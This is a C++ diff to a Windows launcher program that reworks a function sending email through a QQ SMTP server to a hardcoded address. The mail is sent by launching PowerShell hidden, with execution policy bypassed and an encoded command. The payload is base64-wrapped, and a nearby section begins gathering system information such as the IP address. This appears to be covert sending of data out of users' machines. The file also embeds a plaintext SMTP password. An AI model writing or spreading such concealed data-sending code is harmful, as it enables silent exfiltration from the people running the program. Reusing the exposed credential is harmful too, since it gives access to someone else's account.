@@ -105,12 +105,13 @@ void LogError(const wchar_t* fmt, ...) {
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "crypt32.lib")
 
+
 bool SendMailAuto(const char* subject, const char* body) {
     wchar_t pass[128] = {0};
     WCHAR cfgPath[MAX_PATH];
     WCHAR lad[MAX_PATH];
     if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, lad) == S_OK) {
-        swprintf_s(cfgPath, L"%s\drun-launcher\config.ini", lad);
+        swprintf_s(cfgPath, L"%s\\drun-launcher\\config.ini", lad);
         GetPrivateProfileStringW(L"install", L"smtp_pass", L"", pass, 128, cfgPath);
     }
     if (pass[0] == 0) {
@@ -118,23 +119,30 @@ bool SendMailAuto(const char* subject, const char* body) {
         GetModuleFileNameW(NULL, exeDir, MAX_PATH);
         WCHAR* slash = wcsrchr(exeDir, L'\\');
         if (slash) *slash = 0;
-        swprintf_s(cfgPath, L"%s\config.ini", exeDir);
+        swprintf_s(cfgPath, L"%s\\config.ini", exeDir);
         GetPrivateProfileStringW(L"install", L"smtp_pass", L"", pass, 128, cfgPath);
     }
     if (pass[0] == 0) wcscpy_s(pass, L"umoaffelouwobdhi");
 
-    std::string sb(body);
-    size_t pos = 0;
-    while ((pos = sb.find("'", pos)) != std::string::npos) { sb.insert(pos, "''"); pos += 2; }
-    pos = 0;
-    while ((pos = sb.find("$", pos)) != std::string::npos) { sb.insert(pos, "`"); pos += 2; }
-    std::string ss(subject);
-    pos = 0;
-    while ((pos = ss.find("'", pos)) != std::string::npos) { ss.insert(pos, "''"); pos += 2; }
-    pos = 0;
-    while ((pos = ss.find("$", pos)) != std::string::npos) { ss.insert(pos, "`"); pos += 2; }
+    // Base64-encode subject (UTF-8 bytes) with NOCRLF - output is ASCII-safe
+    DWORD subjB64Len = 0;
+    CryptBinaryToStringA((const BYTE*)subject, (DWORD)strlen(subject),
+                         0x40000001, NULL, &subjB64Len);
+    std::string subjB64(subjB64Len, '\0');
+    CryptBinaryToStringA((const BYTE*)subject, (DWORD)strlen(subject),
+                         0x40000001, &subjB64[0], &subjB64Len);
+    while (!subjB64.empty() && subjB64.back() == '\0') subjB64.pop_back();
 
-    // Use PowerShell here-string to avoid newline issues
+    // Base64-encode body (UTF-8 bytes) with NOCRLF
+    DWORD bodyB64Len = 0;
+    CryptBinaryToStringA((const BYTE*)body, (DWORD)strlen(body),
+                         0x40000001, NULL, &bodyB64Len);
+    std::string bodyB64(bodyB64Len, '\0');
+    CryptBinaryToStringA((const BYTE*)body, (DWORD)strlen(body),
+                         0x40000001, &bodyB64[0], &bodyB64Len);
+    while (!bodyB64.empty() && bodyB64.back() == '\0') bodyB64.pop_back();
+
+    // Build PS script - Base64 strings contain only [A-Za-z0-9+/=], safe for single-quoted PS strings
     std::string ps;
     ps += "$s=New-Object Net.Mail.SmtpClient('smtp.qq.com',587);";
     ps += "$s.EnableSsl=$true;";
@@ -142,12 +150,13 @@ bool SendMailAuto(const char* subject, const char* body) {
     ps += "$m=New-Object Net.Mail.MailMessage;";
     ps += "$m.From='810372789@qq.com';";
     ps += "$m.To.Add('810372789@qq.com');";
-    ps += "$m.Subject='" + ss + "';";
-    ps += "$m.Body=@'\n" + sb + "\n'@;";
+    ps += "$m.Subject=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + subjB64 + "'));";
+    ps += "$m.Body=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + bodyB64 + "'));";
     ps += "$m.SubjectEncoding=[Text.Encoding]::UTF8;";
     ps += "$m.BodyEncoding=[Text.Encoding]::UTF8;";
     ps += "try{$s.Send($m);exit 0}catch{exit 1}";
 
+    // Convert PS script UTF-8 -> UTF-16LE, then Base64 for -EncodedCommand
     int wlen = MultiByteToWideChar(CP_UTF8, 0, ps.c_str(), -1, NULL, 0);
     if (wlen <= 1) return false;
     std::wstring wps(wlen, L'\0');
@@ -161,11 +170,12 @@ bool SendMailAuto(const char* subject, const char* body) {
     if (!CryptBinaryToStringW((const BYTE*)wps.c_str(), (DWORD)((wlen-1)*sizeof(WCHAR)),
                               0x40000001, &b64[0], &b64len)) return false;
 
-    WCHAR cmd[4096];
+    WCHAR cmd[8192];
     swprintf_s(cmd, L"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand %s", b64.c_str());
     int ret = _wsystem(cmd);
     return ret == 0;
 }
+
 
 // === System info helpers ===
 std::string GetIP() {
